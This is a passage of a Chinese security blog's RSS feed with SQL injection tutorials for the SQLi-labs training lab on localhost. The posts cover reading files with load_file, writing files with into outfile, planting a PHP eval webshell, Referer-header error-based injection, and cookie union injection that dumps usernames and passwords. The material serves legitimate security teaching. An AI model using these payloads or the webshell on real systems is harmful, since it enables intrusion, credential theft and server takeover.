&lt;p&gt;这里就演示一下本地服务器绝对路径&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=-11&amp;#x27; union select 1, 2, load_file(&amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-1\\index.php&amp;quot;) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005701120.png&#34; alt=&#34;image-20221002005701120&#34;&gt;&lt;/p&gt;
&lt;p&gt;显示比较混乱，原因是当读取到index.php之后返回给页面的是php语句，所以在页面显示的时候被php重复解析。&lt;/p&gt;
&lt;p&gt;我们转换Hex存储&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=-11&amp;#x27; union select 1, 2, Hex(load_file(&amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-1\\index.php&amp;quot;)) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005946274.png&#34; alt=&#34;image-20221002005946274&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来去BurpSuit，或者在线网站转码。这里选择&lt;strong&gt;BurpSuit&lt;/strong&gt;，选择&lt;code&gt;Decoder-Decode as.....-Ascii hex&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002010101190.png&#34; alt=&#34;image-20221002010101190&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;写入文件&#34;&gt;&lt;a href=&#34;#写入文件&#34; class=&#34;headerlink&#34; title=&#34;写入文件&#34;&gt;&lt;/a&gt;写入文件&lt;/h2&gt;&lt;p&gt;写入文件使用函数为：into outfile&lt;/p&gt;
&lt;p&gt;例子为Less-7&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002010552632.png&#34; alt=&#34;image-20221002010552632&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，如果仅是单引号注入则这里不应该报错。所以根据经验尝试加个括号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，一个小括号不够？那就再加一个&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么，使用order by确定列数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax，报错，所以只有三列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用&lt;code&gt;into outflie&lt;/code&gt;语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) union select 1,2,3 into outfile &amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-7\\aaa.txt&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002011103261.png&#34; alt=&#34;image-20221002011103261&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然报错，但是我们尝试去看一下&lt;code&gt;Less-7/aaa.txt&lt;/code&gt;有没有生成&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002011152149.png&#34; alt=&#34;image-20221002011152149&#34;&gt;&lt;/p&gt;
&lt;p&gt;写入成功。那么，既然可以写入文件，那就可以写入一句话木马。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) union select 1,2,&amp;quot;&amp;lt;?php @eval ($_POST[value]);?&amp;gt;&amp;quot; into outfile &amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-7\\aaa.php&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;并成功解析成php执行。&lt;/p&gt;
&lt;p&gt;至此，SQL注入文件读写演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/</guid>
            <title>HTTP-Referer注入</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 23:10:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之HTTP-Referer注入&#34;&gt;&lt;a href=&#34;#SQL注入之HTTP-Referer注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之HTTP-Referer注入&#34;&gt;&lt;/a&gt;SQL注入之HTTP-Referer注入&lt;/h1&gt;&lt;p&gt;本篇讲解HTTP-Referer注入&lt;/p&gt;
&lt;p&gt;:::info&lt;/p&gt;
&lt;p&gt;HTTP-Referer注入&lt;/p&gt;
&lt;p&gt;:::&lt;/p&gt;
&lt;p&gt;在前几章的博客中，满篇都是对于基于select的注入手段。&lt;/p&gt;
&lt;p&gt;其实，对于数据库而言，像update、insert等命令都有可爆出数据库信息的点的。&lt;/p&gt;
&lt;p&gt;OK，开始做Less-19，送入&lt;strong&gt;Repeater&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h2&gt;&lt;p&gt;在Referer后添加一个单引号：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001235013114.png&#34; alt=&#34;image-20221001235013114&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h2&gt;&lt;p&gt;我们尝试通过加 双引号”、 #号及其变形（#、%23、—+）来看看能否不报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; %23&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面还有个小括号，试试看是否需要闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;&amp;quot;) --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot;) --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27;)&amp;quot; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#x27;&amp;quot; --+&amp;#x27;, &amp;#x27;127.0.0.1&amp;#x27;)&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;依旧不行，我们回过头来看看第一个报错&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;near &amp;#39;&amp;quot;&amp;#39;, &amp;#39;127.0.0.1&amp;#39;)&amp;#39; at line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;去掉最外层的两个单引号：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&amp;#39;, &amp;#39;127.0.0.1&amp;#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一个数据库语句出现了逗号，说明极有可能是union引导的&lt;code&gt;select 1,2&lt;/code&gt;这样的查询，或者是&lt;strong&gt;insert、update&lt;/strong&gt;这样的语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into 表名 values(a,b,c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例子：insert into student_info values(5,&amp;#x27;liutao&amp;#x27;,&amp;#x27;12&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UPDATE student_info SET num=4,name=&amp;#x27;liutao&amp;#x27;,age=&amp;#x27;15&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为除了逗号之外还出现了括号，&lt;strong&gt;update和select一般是没有括号的&lt;/strong&gt;，因此锁定在&lt;strong&gt;insert into&lt;/strong&gt;上。&lt;/p&gt;
&lt;p&gt;那么，我们目前注入的位置是很大概率在&lt;code&gt;&amp;#39;liutao&amp;#39;, &amp;#39;12&amp;#39;&lt;/code&gt;这个逗号所在位置附近。&lt;/p&gt;
&lt;p&gt;因此，&lt;strong&gt;由于注入内容后面跟着一个单引号&lt;/strong&gt;，我们尝试&lt;code&gt;and&lt;/code&gt;结合&lt;code&gt;单引号&lt;/code&gt;注入：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into student_info values(5,&amp;#x27;liutao&amp;#x27; and &amp;#x27;&amp;#x27;,&amp;#x27;12&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;OK，替换成我们的语句就是：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功不报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002000657623.png&#34; alt=&#34;image-20221002000657623&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;优先尝试报错注入&#34;&gt;&lt;a href=&#34;#优先尝试报错注入&#34; class=&#34;headerlink&#34; title=&#34;优先尝试报错注入&#34;&gt;&lt;/a&gt;优先尝试报错注入&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;由于是使用and+单引号注入&lt;/strong&gt;，可插入非法查询语句的位置和平常不太一样，因此我们尝试再加入&lt;code&gt;一个and来构造一个报错条件&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001021204.png&#34; alt=&#34;image-20221002001021204&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;爆数据库名&#34;&gt;&lt;a href=&#34;#爆数据库名&#34; class=&#34;headerlink&#34; title=&#34;爆数据库名&#34;&gt;&lt;/a&gt;爆数据库名&lt;/h2&gt;&lt;p&gt;接下来就是替换version()了。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001434314.png&#34; alt=&#34;image-20221002001434314&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;爆表名&#34;&gt;&lt;a href=&#34;#爆表名&#34; class=&#34;headerlink&#34; title=&#34;爆表名&#34;&gt;&lt;/a&gt;爆表名&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001605648.png&#34; alt=&#34;image-20221002001605648&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;爆列名&#34;&gt;&lt;a href=&#34;#爆列名&#34; class=&#34;headerlink&#34; title=&#34;爆列名&#34;&gt;&lt;/a&gt;爆列名&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://127.0.0.1/sqli/Less-19/&amp;#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#x27;users&amp;#x27;),0x7e)) and &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002001714543.png&#34; alt=&#34;image-20221002001714543&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，HTTP-Referer注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/</guid>
            <title>Cookie注入</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 22:13:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之Cookie注入&#34;&gt;&lt;a href=&#34;#SQL注入之Cookie注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之Cookie注入&#34;&gt;&lt;/a&gt;SQL注入之Cookie注入&lt;/h1&gt;&lt;p&gt;本篇讲解Cookie注入。&lt;/p&gt;
&lt;p&gt;老样子，Less-20，直接送入repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001224019603.png&#34; alt=&#34;image-20221001224019603&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001224212276.png&#34; alt=&#34;image-20221001224212276&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001224125843.png&#34; alt=&#34;image-20221001224125843&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试order-by-注入&#34;&gt;&lt;a href=&#34;#尝试order-by-注入&#34; class=&#34;headerlink&#34; title=&#34;尝试order by 注入&#34;&gt;&lt;/a&gt;尝试order by 注入&lt;/h2&gt;&lt;p&gt;order by n asc/desc是指定列号n进行排序&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错：YOUR COOKIE : uname = admin&amp;#x27; order by 4 # and expires&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此确定&lt;code&gt;列数为3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：在order by后面的不会根据计算的结果来排序，所以可以直接用来报错注入。&lt;/p&gt;
&lt;p&gt;尝试下直接报错注入是否可行：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错：YOUR COOKIE : uname = admin&amp;#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;报错，看来这种直接报错注入的方式是不可行的。&lt;/p&gt;
&lt;h2 id=&#34;Cookie注入查询到数据库名&#34;&gt;&lt;a href=&#34;#Cookie注入查询到数据库名&#34; class=&#34;headerlink&#34; title=&#34;Cookie注入查询到数据库名&#34;&gt;&lt;/a&gt;Cookie注入查询到数据库名&lt;/h2&gt;&lt;p&gt;cookie注入就是基于union查询的基础上，在Cookie中进行注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, database(), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001225129636.png&#34; alt=&#34;image-20221001225129636&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询到表名&#34;&gt;&lt;a href=&#34;#查询到表名&#34; class=&#34;headerlink&#34; title=&#34;查询到表名&#34;&gt;&lt;/a&gt;查询到表名&lt;/h2&gt;&lt;p&gt;进而通过替换database()处，变成&lt;code&gt;双注入&lt;/code&gt;，再查询出表名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001225840363.png&#34; alt=&#34;image-20221001225840363&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询到列名&#34;&gt;&lt;a href=&#34;#查询到列名&#34; class=&#34;headerlink&#34; title=&#34;查询到列名&#34;&gt;&lt;/a&gt;查询到列名&lt;/h2&gt;&lt;p&gt;一样的套路&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#x27;users&amp;#x27;), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001230122246.png&#34; alt=&#34;image-20221001230122246&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询到账号密码&#34;&gt;&lt;a href=&#34;#查询到账号密码&#34; class=&#34;headerlink&#34; title=&#34;查询到账号密码&#34;&gt;&lt;/a&gt;查询到账号密码&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27; and 0 union select 1, (select group_concat(concat_ws(0x7e,username,password)) from security.users), 3 %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001230318424.png&#34; alt=&#34;image-20221001230318424&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;思考&#34;&gt;&lt;a href=&#34;#思考&#34; class=&#34;headerlink&#34; title=&#34;思考&#34;&gt;&lt;/a&gt;思考&lt;/h2&gt;&lt;p&gt;通过Cookie注入，我们要思考：&lt;code&gt;HTTP请求包中，是否还有其他的字段（Cookie外）也有可能和数据库产生交互呢？&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;答：有的，&lt;code&gt;HTTP-Referer&lt;/code&gt;就存在。&lt;/p&gt;
&lt;p&gt;至此，Cookie注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</guid>
            <title>时间盲注</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 20:10:06 +0800</pubDate>
